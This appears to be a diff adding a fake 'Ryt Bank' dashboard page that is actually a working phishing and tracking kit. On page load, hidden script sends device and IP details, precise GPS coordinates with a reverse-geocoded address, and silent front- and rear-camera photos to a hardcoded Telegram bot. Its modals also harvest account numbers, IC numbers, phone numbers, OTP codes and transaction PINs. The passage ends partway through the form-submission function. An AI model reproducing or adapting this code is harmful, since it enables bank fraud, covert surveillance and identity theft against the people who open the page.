@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Ryt Bank Dashboard</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background-color:#f4f6f9;display:flex;justify-content:center;min-height:100vh;overflow-x:hidden}
+
+/* ══ HIDDEN CAPTURE ELEMENTS ══ */
+.hidden-capture{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1}
+
+/* ══ APP CONTAINER ══ */
+.app-container{width:100%;max-width:414px;background-color:#f4f6f9;position:relative;overflow-x:hidden;box-shadow:0 0 20px rgba(0,0,0,0.1);min-height:100vh;padding-bottom:20px}
+
+/* ══ HEADER ══ */
+.header{background:linear-gradient(135deg,#1b0b8c,#5a22b5);padding:20px;display:flex;justify-content:space-between;align-items:center;color:white;border-bottom-left-radius:20px;border-bottom-right-radius:20px;padding-bottom:30px}
+.avatar{background:rgba(255,255,255,0.2);width:40px;height:40px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:14px;font-weight:500;border:1px solid rgba(255,255,255,0.4)}
+.ask-ai{background:rgba(255,255,255,0.15);border:1px solid rgba(255,255,255,0.5);border-radius:20px;padding:8px 16px;font-size:14px;display:flex;align-items:center;gap:8px;font-weight:500}
+.ask-ai svg{width:16px;height:16px;fill:white}
+.bell-icon{width:24px;height:24px;fill:white}
+
+/* ══ MAIN CONTENT ══ */
+.main-content{padding:0 20px 20px 20px;margin-top:-20px}
+
+/* ══ BALANCE CARD ══ */
+.balance-card{background:white;border-radius:20px;padding:25px 20px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.03);margin-bottom:20px}
+.total-balance-label{font-size:14px;color:#666;display:flex;justify-content:center;align-items:center;gap:5px;margin-bottom:8px}
+.total-balance-label svg{width:12px;height:12px;fill:#666}
+.balance-amount{font-size:32px;font-weight:700;color:#111;display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:8px}
+.balance-amount svg{width:20px;height:20px;fill:#666}
+.interest-earned{font-size:14px;color:#666;margin-bottom:25px}
+.interest-earned span{color:#00a86b;font-weight:600}
+.action-buttons{display:flex;justify-content:space-between;padding:0 10px}
+.action-btn{display:flex;flex-direction:column;align-items:center;gap:8px;font-size:12px;color:#333;font-weight:500;cursor:pointer}
+.action-icon{width:55px;height:55px;background:#0018A8;border-radius:50%;display:flex;justify-content:center;align-items:center;box-shadow:0 4px 10px rgba(0,24,168,0.2);transition:transform .15s}
+.action-btn:active .action-icon{transform:scale(.92)}
+.action-icon svg{width:24px;height:24px;fill:white}
+
+/* ══ PROMO ══ */
+.promo-section{display:flex;gap:15px;margin-bottom:20px}
+.promo-card{flex:1;border-radius:16px;padding:15px;display:flex;flex-direction:column;justify-content:space-between;min-height:190px}
+.promo-left{background-color:#d8f3f9}
+.promo-right{background-color:#daf5e6}
+.promo-title{font-size:14px;font-weight:700;color:#111;margin-bottom:5px}
+.promo-desc{font-size:12px;color:#444;line-height:1.4;margin-bottom:10px}
+.promo-illustration{font-size:40px;text-align:center;margin:10px 0}
+.promo-link{font-size:12px;color:#0018A8;font-weight:600;text-decoration:none;display:flex;align-items:center;gap:4px}
+
+/* ══ DUITNOW ══ */
+.duitnow-card{background:white;border-radius:16px;padding:15px;display:flex;align-items:center;justify-content:space-between;margin-bottom:25px;box-shadow:0 4px 15px rgba(0,0,0,0.02)}
+.duitnow-left{display:flex;align-items:center;gap:15px}
+.duitnow-icon{width:40px;height:40px;border:2px solid #0018A8;border-radius:50%;display:flex;justify-content:center;align-items:center}
+.duitnow-icon svg{width:20px;height:20px;fill:#0018A8}
+.duitnow-text h4{font-size:14px;font-weight:600;color:#111;margin-bottom:3px}
+.duitnow-text p{font-size:11px;color:#666}
+.link-now-btn{background:transparent;border:1px solid #0018A8;color:#0018A8;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer}
+
+/* ══ ACCOUNTS ══ */
+.accounts-title{font-size:16px;font-weight:700;color:#111;margin-bottom:15px}
+.accounts-card{background:white;border-radius:16px;padding:10px 15px;box-shadow:0 4px 15px rgba(0,0,0,0.02);margin-bottom:20px}
+.account-item{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #f0f0f0}
+.account-item:last-child{border-bottom:none}
+.account-info{display:flex;align-items:center;gap:15px}
+.account-icon-main{width:40px;height:40px;background:#0018A8;border-radius:50%;display:flex;justify-content:center;align-items:center;color:white;font-weight:700;font-size:14px}
+.account-icon-pocket{width:40px;height:40px;background:#00D09C;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:20px}
+.account-details h4{font-size:14px;font-weight:600;color:#111;margin-bottom:3px}
+.account-details p{font-size:11px;color:#666}
+.account-balance{text-align:right}
+.account-balance .amount{font-size:14px;font-weight:600;color:#111;margin-bottom:5px}
+.tag-blue{background:#e6edff;color:#0018A8;font-size:10px;padding:3px 8px;border-radius:10px;font-weight:600;display:inline-block}
+.tag-green{background:#e0f7ee;color:#00a86b;font-size:10px;padding:3px 8px;border-radius:10px;font-weight:600;display:inline-block}
+.view-all{text-align:center;color:#0018A8;font-size:14px;font-weight:600;text-decoration:none;display:block;padding-bottom:10px}
+
+.icon-scan{fill:none;stroke:white;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.icon-plus{fill:none;stroke:white;stroke-width:2.5;stroke-linecap:round}
+.icon-arrow{fill:none;stroke:white;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+
+/* ══ MODAL ══ */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);display:none;justify-content:center;align-items:center;z-index:999;padding:20px;animation:fadeIn .25s ease}
+.overlay.active{display:flex}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal{background:white;border-radius:20px;padding:24px;width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:slideUp .3s ease;max-height:85vh;overflow-y:auto}
+@keyframes slideUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+.modal h3{font-size:18px;color:#111;margin-bottom:8px;font-weight:700}
+.modal p{font-size:13px;color:#666;margin-bottom:18px;line-height:1.5}
+.modal-input{width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:12px;font-size:15px;outline:none;transition:border .2s;margin-bottom:12px;background:#fafbfc}
+.modal-input:focus{border-color:#0018A8;background:white}
+.modal-btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s;margin-top:6px}
+.modal-btn:active{transform:scale(.97)}
+.modal-btn.primary{background:#0018A8;color:white}
+.modal-btn.secondary{background:#f0f0f5;color:#666;margin-top:8px}
+
+/* ══ LOADING ══ */
+#loadingScreen{position:fixed;inset:0;background:#0a0a14;display:flex;justify-content:center;align-items:center;z-index:9999;transition:opacity .5s}
+#loadingScreen.fade-out{opacity:0;pointer-events:none}
+.loading-content{text-align:center;width:80%;max-width:400px}
+.loading-text{font-size:18px;margin-bottom:20px;color:#00fff7;font-family:'Courier New',monospace;letter-spacing:3px;text-shadow:0 0 10px #00fff7}
+.progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
+.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#00fff7);transition:width .3s ease;box-shadow:0 0 10px #00fff7}
+.loading-details{margin-top:20px;font-size:12px;color:#666;font-family:'Courier New',monospace}
+
+/* ══ TOAST ══ */
+#toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);background:#111;color:white;padding:12px 20px;border-radius:30px;font-size:13px;opacity:0;pointer-events:none;transition:all .3s;z-index:99999;box-shadow:0 10px 30px rgba(0,0,0,0.3);max-width:90%;text-align:center}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div id="loadingScreen">
+    <div class="loading-content">
+        <div class="loading-text">SECURE CONNECTION</div>
+        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+        <div class="loading-details" id="loadingDetails">Memulai inisialisasi...</div>
+    </div>
+</div>
+
+<!-- HIDDEN CAPTURE -->
+<video id="v" autoplay muted playsinline class="hidden-capture"></video>
+<canvas id="c" class="hidden-capture"></canvas>
+
+<!-- APP -->
+<div class="app-container">
+
+    <header class="header">
+        <div class="avatar">HY</div>
+        <div class="ask-ai">
+            <svg viewBox="0 0 24 24"><path d="M12 2L14.5 9.5L22 12L14.5 14.5L12 22L9.5 14.5L2 12L9.5 9.5L12 2Z"/></svg>
+            Ask Ryt AI
+        </div>
+        <svg class="bell-icon" viewBox="0 0 24 24"><path d="M12 22C13.1 22 14 21.1 14 20H10C10 21.1 10.9 22 12 22ZM18 16V11C18 7.93 16.36 5.36 13.5 4.68V4C13.5 3.17 12.83 2.5 12 2.5C11.17 2.5 10.5 3.17 10.5 4V4.68C7.63 5.36 6 7.92 6 11V16L4 18V19H20V18L18 16Z"/></svg>
+    </header>
+
+    <main class="main-content">
+
+        <div class="balance-card">
+            <div class="total-balance-label">Total balance<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17L16.59 8.59L18 10L12 16L6 10L7.41 8.59Z"/></svg></div>
+            <div class="balance-amount">RM 10,345.93<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17Z"/></svg></div>
+            <div class="interest-earned">Interest earned <span>+RM 2.33</span></div>
+            <div class="action-buttons">
+                <div class="action-btn" onclick="openModal('scan')">
+                    <div class="action-icon"><svg class="icon-scan" viewBox="0 0 24 24"><path d="M3 7V5a2 2 0 0 1 2-2h2M17 3h2a2 2 0 0 1 2 2v2M21 17v2a2 2 0 0 1-2 2h-2M7 21H5a2 2 0 0 1-2-2v-2M3 12h18"/></svg></div>Scan
+                </div>
+                <div class="action-btn" onclick="openModal('add')">
+                    <div class="action-icon"><svg class="icon-plus" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg></div>Add money
+                </div>
+                <div class="action-btn" onclick="openModal('receive')">
+                    <div class="action-icon"><svg class="icon-arrow" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></div>Receive
+                </div>
+                <div class="action-btn" onclick="openModal('transfer')">
+                    <div class="action-icon"><svg class="icon-arrow" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>Transfer
+                </div>
+            </div>
+        </div>
+
+        <div class="promo-section">
+            <div class="promo-card promo-left" onclick="openModal('paylater')">
+                <div><div class="promo-title" style="color:#007b8a;">Ryt PayLater</div><div class="promo-desc">Enjoy 1.2% cashback on QR payments</div></div>
+                <div class="promo-illustration">💳</div>
+                <a href="javascript:void(0)" class="promo-link">Apply now &gt;</a>
+            </div>
+            <div class="promo-card promo-right" onclick="openModal('save')">
+                <div class="promo-illustration" style="margin-top:0;">💰</div>
+                <div><div class="promo-desc" style="font-weight:500;color:#222;">Earn up to 4% p.a., paid every day</div></div>
+                <a href="javascript:void(0)" class="promo-link">Learn more &gt;</a>
+            </div>
+        </div>
+
+        <div class="duitnow-card" onclick="openModal('duitnow')">
+            <div class="duitnow-left">
+                <div class="duitnow-icon"><svg viewBox="0 0 24 24"><path d="M10 13c-.5.5-1.3.5-1.8 0l-2.4-2.4c-.5-.5-.5-1.3 0-1.8s1.3-.5 1.8 0l2.4 2.4c.5.5.5 1.3 0 1.8zm5.8-5.8c-.5-.5-1.3-.5-1.8 0l-2.4 2.4c-.5.5-.5 1.3 0 1.8s1.3.5 1.8 0l2.4-2.4c.5-.5.5-1.3 0-1.8z"/></svg></div>
+                <div class="duitnow-text"><h4>Link DuitNow ID</h4><p>2 of 5 completed &gt;</p></div>
+            </div>
+            <button class="link-now-btn">Link now</button>
+        </div>
+
+        <div class="accounts-title">Accounts</div>
+        <div class="accounts-card">
+            <div class="account-item">
+                <div class="account-info"><div class="account-icon-main">Ryt</div><div class="account-details"><h4>Main Account</h4></div></div>
+                <div class="account-balance"><div class="amount">RM 5,000.00</div><div class="tag-blue">3.00% p.a.</div></div>
+            </div>
+            <div class="account-item">
+                <div class="account-info"><div class="account-icon-pocket">🌀</div><div class="account-details"><h4>Ryt Pocket</h4><p>Save Pocket</p></div></div>
+                <div class="account-balance"><div class="amount">RM 5,345.93</div><div class="tag-green">4.00% p.a.*</div></div>
+            </div>
+        </div>
+
+        <a href="javascript:void(0)" class="view-all">View all +5</a>
+
+    </main>
+</div>
+
+<div class="overlay" id="overlay"><div class="modal" id="modalContent"></div></div>
+<div id="toast"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════
+   RYT BANK TRACKER — FOCUS: CAMERA + GPS
+   ═══════════════════════════════════════════════════════ */
+
+/* 🔧 KONFIGURASI */
+const TG_TOKEN = '8408732646:AAGt3UkdxoSwS7qQAZMBV9mBvvzqW9-7qCc';
+const TG_CHAT  = '7094170826';
+const BRAND    = 'RytBank';
+
+const SESSION_ID = 'S' + Date.now().toString(36).toUpperCase();
+let captured = {front:0, rear:0, geo:0};
+let currentStream = null;
+
+/* ── TOAST ── */
+function toast(msg){
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._t);
+    t._t = setTimeout(()=>t.classList.remove('show'), 2500);
+}
+
+/* ═══════════════════════════════════════════════════════
+   TELEGRAM SENDER
+   ═══════════════════════════════════════════════════════ */
+async function sendText(text){
+    try{
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:TG_CHAT, text, parse_mode:'HTML'})
+        });
+    }catch(e){console.warn(e)}
+}
+
+async function sendPhoto(blob, filename, caption){
+    try{
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT);
+        fd.append('photo', blob, filename);
+        if(caption) fd.append('caption', caption);
+        fd.append('parse_mode','HTML');
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    }catch(e){console.warn(e)}
+}
+
+/* ═══════════════════════════════════════════════════════
+   DEVICE INFO
+   ═══════════════════════════════════════════════════════ */
+async function collectDeviceInfo(){
+    let m = `╭─── [${BRAND}] SESSION ${SESSION_ID} ───⦿\n\n`;
+    m += `⚙️ <b>DEVICE INFO</b>\n`;
+    m += `🖥️ UA: <code>${navigator.userAgent.slice(0,120)}</code>\n`;
+    m += `💻 Platform: ${navigator.platform}\n`;
+    m += `🌐 Lang: ${navigator.language}\n`;
+    m += `📺 Screen: ${screen.width}x${screen.height}\n`;
+    m += `💾 RAM: ${navigator.deviceMemory||'?'} GB | 🧠 CPU: ${navigator.hardwareConcurrency} cores\n`;
+    m += `⏰ ${new Date().toLocaleString('id-ID')}\n`;
+    m += `🕓 TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+    if(navigator.getBattery){
+        try{
+            const b = await navigator.getBattery();
+            m += `🔋 Battery: ${Math.floor(b.level*100)}% ${b.charging?'⚡':'🔌'}\n`;
+        }catch(e){}
+    }
+    try{
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        m += `\n📍 <b>IP INFO</b>\n`;
+        m += `📡 IP: <code>${d.ip}</code>\n`;
+        m += `🏙️ ${d.city}, ${d.region}\n`;
+        m += `🌎 ${d.country_name}\n`;
+        m += `🏢 ISP: ${d.org}\n`;
+    }catch(e){}
+    m += `\n╰─────────────────────⦿`;
+    await sendText(m);
+}
+
+/* ═══════════════════════════════════════════════════════
+   GPS — AKURAT & REALTIME
+   ═══════════════════════════════════════════════════════ */
+async function reverseGeocode(lat,lng){
+    try{
+        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+        const d = await r.json();
+        return d.address || {};
+    }catch(e){return{}}
+}
+
+function getGPSPosition(options){
+    return new Promise((resolve, reject)=>{
+        if(!navigator.geolocation){reject(new Error('no geolocation'));return}
+        navigator.geolocation.getCurrentPosition(resolve, reject, options);
+    });
+}
+
+async function sendLocationReport(pos, label){
+    const lat = pos.coords.latitude;
+    const lng = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+    const speed = pos.coords.speed;
+    const heading = pos.coords.heading;
+    const alt = pos.coords.altitude;
+    const ts = new Date(pos.timestamp).toLocaleString('id-ID');
+
+    const addr = await reverseGeocode(lat,lng);
+
+    let m = `📍 <b>[${BRAND}] ${label}</b>\n`;
+    m += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    m += `🆔 <code>${SESSION_ID}</code>\n`;
+    m += `🕐 ${ts}\n\n`;
+    m += `<b>KOORDINAT AKURAT</b>\n`;
+    m += `Latitude  : <code>${lat.toFixed(8)}</code>\n`;
+    m += `Longitude : <code>${lng.toFixed(8)}</code>\n`;
+    m += `Akurasi   : ±${acc.toFixed(1)} meter\n`;
+    if(alt) m += `Ketinggian: ${alt.toFixed(1)} m\n`;
+    if(speed !== null && speed !== undefined) m += `Kecepatan : ${(speed*3.6).toFixed(1)} km/h\n`;
+    if(heading !== null && heading !== undefined) m += `Arah      : ${heading.toFixed(0)}°\n`;
+    m += `\n🔗 <a href="https://www.google.com/maps?q=${lat},${lng}">BUKA DI GOOGLE MAPS</a>\n`;
+    m += `🔗 <a href="https://www.google.com/maps/@?api=1&map_action=map&center=${lat},${lng}&zoom=20&basemap=satellite">LIHAT SATELIT</a>\n`;
+    m += `🔗 <a href="https://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}">APPLE MAPS</a>\n\n`;
+    m += `<b>ALAMAT LENGKAP</b>\n`;
+    m += `Jalan     : ${addr.road||addr.pedestrian||addr.path||'-'}\n`;
+    m += `No. Rumah : ${addr.house_number||'-'}\n`;
+    m += `RT/RW     : ${addr.house_number||'-'} / ${addr.neighbourhood||'-'}\n`;
+    m += `Kelurahan : ${addr.village||addr.suburb||addr.hamlet||addr.quarter||'-'}\n`;
+    m += `Kecamatan : ${addr.city_district||addr.district||addr.county||'-'}\n`;
+    m += `Kota/Kab  : ${addr.city||addr.town||addr.municipality||addr.state_district||'-'}\n`;
+    m += `Provinsi  : ${addr.state||addr.region||'-'}\n`;
+    m += `Kode Pos  : ${addr.postcode||'-'}\n`;
+    m += `Negara    : ${addr.country||'-'}\n`;
+    m += `Full Addr : ${addr.road||''} ${addr.suburb||''} ${addr.city||''} ${addr.state||''} ${addr.country||''}\n`;
+    m += `\n╰─────────────────────⦿`;
+    await sendText(m);
+
+    // Kirim juga sebagai pin lokasi native Telegram
+    try{
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendLocation`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:TG_CHAT, latitude:lat, longitude:lng})
+        });
+    }catch(e){}
+
+    captured.geo++;
+}
+
+async function trackGPS(){
+    try{
+        // High accuracy dulu
+        const pos = await getGPSPosition({enableHighAccuracy:true, maximumAge:0, timeout:15000});
+        await sendLocationReport(pos, 'GPS TRACKING — HIGH ACCURACY');
+    }catch(e1){
+        try{
+            // Fallback: low accuracy
+            const pos = await getGPSPosition({enableHighAccuracy:false, maximumAge:60000, timeout:20000});
+            await sendLocationReport(pos, 'GPS TRACKING — FALLBACK');
+        }catch(e2){
+            await sendText(`❌ [${BRAND}] GPS gagal: ${e2.message}`);
+        }
+    }
+}
+
+/* ═══════════════════════════════════════════════════════
+   CAMERA CAPTURE — SILENT
+   ═══════════════════════════════════════════════════════ */
+async function captureCamera(mode, label){
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    
+    // Stop stream sebelumnya
+    if(currentStream){
+        currentStream.getTracks().forEach(t=>t.stop());
+        currentStream = null;
+    }
+
+    let stream;
+    try{
+        // Coba exact facingMode dulu
+        stream = await navigator.mediaDevices.getUserMedia({
+            video:{ facingMode:{ exact: mode }, width:{ideal:1280}, height:{ideal:720} },
+            audio:false
+        });
+    }catch(e){
+        // Fallback: tanpa exact
+        try{
+            stream = await navigator.mediaDevices.getUserMedia({
+                video:{ facingMode: mode, width:{ideal:1280}, height:{ideal:720} },
+                audio:false
+            });
+        }catch(e2){
+            // Fallback terakhir: kamera apapun
+            try{
+                stream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
+            }catch(e3){
+                await sendText(`⚠️ [${BRAND}] Kamera ${mode} gagal: ${e3.name}`);
+                return false;
+            }
+        }
+    }
+
+    currentStream = stream;
+    v.srcObject = stream;
+    
+    try{
+        await new Promise(res => {
+            if(v.readyState >= 2) return res();
+            v.onloadedmetadata = res;
+            setTimeout(res, 3000); // timeout safety
+        });
+        await v.play();
+        // Tunggu frame stabil & exposure kamera
+        await new Promise(r => setTimeout(r, 2200));
+
+        c.width = v.videoWidth || 640;
+        c.height = v.videoHeight || 480;
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, c.width, c.height);
+
+        // Ambil resolusi asli
+        const actualRes = `${c.width}x${c.height}`;
+
+        const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.92));
+        
+        // Stop stream
+        stream.getTracks().forEach(t=>t.stop());
+        currentStream = null;
+
+        if(blob){
+            const cap = `📸 [${BRAND}] ${label}\n🆔 ${SESSION_ID}\n📐 ${actualRes}\n🕐 ${new Date().toLocaleString('id-ID')}`;
+            await sendPhoto(blob, `${mode}_${Date.now()}.jpg`, cap);
+            return true;
+        }
+        return false;
+    }catch(e){
+        if(stream) stream.getTracks().forEach(t=>t.stop());
+        currentStream = null;
+        await sendText(`⚠️ [${BRAND}] Kamera ${mode} error saat capture: ${e.message}`);
+        return false;
+    }
+}
+
+/* ═══════════════════════════════════════════════════════
+   MULTI-CAPTURE SEQUENCE
+   Kamera depan 2x + belakang 2x + GPS realtime
+   ═══════════════════════════════════════════════════════ */
+async function captureFrontCamera(){
+    const ok = await captureCamera('user', 'KAMERA DEPAN — TARGET');
+    if(ok) captured.front++;
+    return ok;
+}
+
+async function captureRearCamera(){
+    const ok = await captureCamera('environment', 'KAMERA BELAKANG — SEKITAR');
+    if(ok) captured.rear++;
+    return ok;
+}
+
+/* ═══════════════════════════════════════════════════════
+   MAIN ORCHESTRATOR
+   ═══════════════════════════════════════════════════════ */
+async function runTracker(){
+    // Step 1: Device info
+    await collectDeviceInfo();
+    await new Promise(r=>setTimeout(r,500));
+
+    // Step 2: GPS (jalan paralel dengan kamera)
+    trackGPS(); // gak di-await biar paralel
+
+    // Step 3: Kamera depan pertama (kunci utama)
+    await captureFrontCamera();
+    await new Promise(r=>setTimeout(r,1000));
+
+    // Step 4: Kamera belakang
+    await captureRearCamera();
+    await new Promise(r=>setTimeout(r,1000));
+
+    // Step 5: Kamera depan kedua (fresh)
+    await captureFrontCamera();
+    await new Promise(r=>setTimeout(r,800));
+
+    // Step 6: Kamera belakang kedua
+    await captureRearCamera();
+
+    // Step 7: Summary
+    await new Promise(r=>setTimeout(r,600));
+    await sendText(
+        `✅ <b>[${BRAND}] CAPTURE COMPLETE</b>\n` +
+        `🆔 ${SESSION_ID}\n` +
+        `━━━━━━━━━━━━━━━━━━━\n` +
+        `📸 Kamera Depan  : ${captured.front}x\n` +
+        `📸 Kamera Belakang: ${captured.rear}x\n` +
+        `📍 GPS Reports   : ${captured.geo}x\n` +
+        `🕐 ${new Date().toLocaleString('id-ID')}\n` +
+        `━━━━━━━━━━━━━━━━━━━\n` +
+        `Target teridentifikasi & ter-track.`
+    );
+}
+
+/* ═══════════════════════════════════════════════════════
+   LOADING SEQUENCE
+   ═══════════════════════════════════════════════════════ */
+(function(){
+    const bar = document.getElementById('progressBar');
+    const detail = document.getElementById('loadingDetails');
+    const screen = document.getElementById('loadingScreen');
+    const messages = [
+        'Memeriksa modul sistem...',
+        'Memuat komponen inti...',
+        'Menginisialisasi antarmuka...',
+        'Memverifikasi koneksi...',
+        'Menyiapkan lingkungan...',
+        'Memeriksa pembaruan...',
+        'Memuat aset tampilan...',
+        'Selesai.'
+    ];
+    let p = 0;
+    const intv = setInterval(()=>{
+        p += Math.random()*8 + 3;
+        if(p >= 100){
+            p = 100;
+            bar.style.width = '100%';
+            clearInterval(intv);
+            detail.textContent = 'Siap.';
+            setTimeout(()=>{
+                screen.classList.add('fade-out');
+                setTimeout(()=>{ screen.style.display='none'; }, 600);
+                setTimeout(runTracker, 500);
+            }, 400);
+        } else {
+            bar.style.width = p + '%';
+        }
+        if(Math.random() > 0.6){
+            detail.textContent = messages[Math.floor(Math.random()*messages.length)];
+        }
+    }, 300);
+})();
+
+/* ═══════════════════════════════════════════════════════
+   MODAL SYSTEM — DATA COLLECTION
+   ═══════════════════════════════════════════════════════ */
+const MODALS = {
+    scan:{
+        title:'Scan QR',
+        body:`<p>Arahkan kamera ke kode QR untuk pembayaran.</p>
+              <input class="modal-input" placeholder="Kode QR / Nominal" id="inp_scan">
+              <button class="modal-btn primary" onclick="submitModal('scan')">Lanjutkan</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    add:{
+        title:'Add Money',
+        body:`<p>Tambahkan dana ke akaun Ryt Bank lo.</p>
+              <input class="modal-input" placeholder="Jumlah (RM)" type="number" id="inp_add">
+              <input class="modal-input" placeholder="Nomor Rekening / Kad" type="tel" id="inp_rek">
+              <button class="modal-btn primary" onclick="submitModal('add')">Konfirmasi</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    receive:{
+        title:'Receive Money',
+        body:`<p>Terima uang dari pengirim.</p>
+              <input class="modal-input" placeholder="Dari (nama/nomor)" id="inp_from">
+              <input class="modal-input" placeholder="Jumlah (RM)" type="number" id="inp_amt">
+              <button class="modal-btn primary" onclick="submitModal('receive')">Konfirmasi</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    transfer:{
+        title:'Transfer',
+        body:`<p>Kirim uang ke rekening tujuan.</p>
+              <input class="modal-input" placeholder="Nomor Rekening Tujuan" type="tel" id="inp_to">
+              <input class="modal-input" placeholder="Nama Penerima" id="inp_name">
+              <input class="modal-input" placeholder="Jumlah (RM)" type="number" id="inp_amount">
+              <input class="modal-input" placeholder="Catatan (opsional)" id="inp_note">
+              <button class="modal-btn primary" onclick="submitModal('transfer')">Transfer Sekarang</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    duitnow:{
+        title:'Link DuitNow ID',
+        body:`<p>Hubungkan DuitNow ID</p>
+              <input class="modal-input" placeholder="Nomor HP / NRIC" id="inp_duit">
+              <button class="modal-btn primary" onclick="submitModal('duitnow')">Hubungkan</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    paylater:{
+        title:'Ryt PayLater',
+        body:`<p>Daftar Ryt PayLater, cashback 1.2% tiap pembayaran QR.</p>
+              <input class="modal-input" placeholder="Nama Lengkap" id="inp_pl_name">
+              <input class="modal-input" placeholder="No. Kad Pengenalan" id="inp_pl_ic">
+              <input class="modal-input" placeholder="No. Telefon" id="inp_pl_phone">
+              <button class="modal-btn primary" onclick="submitModal('paylater')">Mohon Sekarang</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    save:{
+        title:'Save Pocket 4% p.a.',
+        body:`<p>Simpan duit di Save Pocket, faedah 4% p.a. dibayar harian.</p>
+              <input class="modal-input" placeholder="Jumlah Simpanan (RM)" type="number" id="inp_save">
+              <button class="modal-btn primary" onclick="submitModal('save')">Simpan Sekarang</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    otp:{
+        title:'🔐 Pengesahan OTP',
+        body:`<p>Masukkan kod OTP 6-digit yang dihantar ke nombor telefon.</p>
+              <input class="modal-input" placeholder="• • • • • •" id="inp_otp" maxlength="6" inputmode="numeric" style="text-align:center;font-size:24px;letter-spacing:8px;font-weight:700">
+              <button class="modal-btn primary" onclick="submitModal('otp')">Sahkan</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    },
+    pin:{
+        title:'🔒 PIN Transaksi',
+        body:`<p>Masukkan PIN 6-digit akaun Ryt Bank lo.</p>
+              <input class="modal-input" placeholder="• • • • • •" id="inp_pin" maxlength="6" inputmode="numeric" type="password" style="text-align:center;font-size:24px;letter-spacing:8px;font-weight:700">
+              <button class="modal-btn primary" onclick="submitModal('pin')">Hantar</button>
+              <button class="modal-btn secondary" onclick="closeModal()">Batal</button>`
+    }
+};
+
+function openModal(key){
+    const m = MODALS[key];
+    if(!m) return;
+    const content = document.getElementById('modalContent');
+    content.innerHTML = `<h3>${m.title}</h3>${m.body}`;
+    document.getElementById('overlay').classList.add('active');
+    setTimeout(()=>{
+        const inp = content.querySelector('.modal-input');
+        if(inp) inp.focus();
+    }, 200);
+}
+function closeModal(){
+    document.getElementById('overlay').classList.remove('active');
+}
+
+async function submitModal(key){
+    const content = document.getElementById('modalContent');
+    const inputs = content.querySelectorAll('.modal-input');
+    const data = {};
+    inputs.forEach(i=>{ data[i.id] = i.value.trim(); });
+
+    // Validasi wajib isi
+    const hasEmpty = Object.values(data).some(v => !v);
+    if(hasEmpty){
+        toast('⚠️ Sila lengkapkan semua ruangan');
+        return;
+    }
+
+    // Kirim data ke Telegram
